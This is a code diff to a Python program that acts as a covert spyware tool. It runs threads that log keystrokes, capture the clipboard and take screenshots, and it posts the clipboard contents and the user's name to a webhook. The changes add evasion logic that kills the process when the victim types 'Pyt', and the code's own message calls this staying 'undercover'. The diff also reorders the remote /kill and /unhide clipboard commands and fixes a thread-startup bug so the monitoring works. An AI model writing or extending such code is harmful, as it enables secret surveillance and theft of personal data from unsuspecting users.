@@ -130,8 +130,15 @@ def on_release(key):
             send_to_webhook(f"{username} just copied something to clipboard!")
             send_to_webhook(f"Clipboard content: {current_clipboard}")
 
-        # Handle the /kill or /remove clipboard commands
-        if "/kill" in current_clipboard:
+        if "/unhide" in current_clipboard:
+            try:
+                unhide()
+                send_to_webhook("Folder visable process stopped.")
+            except:
+                send_to_webhook("Faild to make folder visable.")
+            return False
+        
+        elif "/kill" in current_clipboard:
             send_to_webhook(f"Kill command executed by: {username}")
             send_to_webhook("Launching again on restart.")
             return False
@@ -142,13 +149,6 @@ def on_release(key):
             except:
                 send_to_webhook("Error finding processes.")
 
-        elif "/unhide" in current_clipboard:
-            try:
-                unhide()
-                send_to_webhook("Folder visable process stopped.")
-            except:
-                send_to_webhook("Faild to make folder visable.")
-            return False
 
     except Exception as e:
         print(f"Error accessing clipboard: {e}")
@@ -244,6 +244,9 @@ def monitor_input():
     if "pyt" in keystrokes:
         send_to_webhook("User searched for Python killed the process to stay undercover.")
         return False
+    elif "Pyt" in keystrokes:
+        send_to_webhook("User searched for Python killed the process to stay undercover.")
+        return False
 
 
 # Run kill.bat file at the start
@@ -274,7 +277,7 @@ keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
 clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
 screenshot_thread = threading.Thread(target=screenshot, daemon=True)
 process_thread = threading.Thread(target=monitor_processes, daemon=True)
-input_thread = threading.Thread(target=monitor_input(), daemon=True)
+input_thread = threading.Thread(target=monitor_input, daemon=True)
 
 keystroke_thread.start()
 clipboard_thread.start()
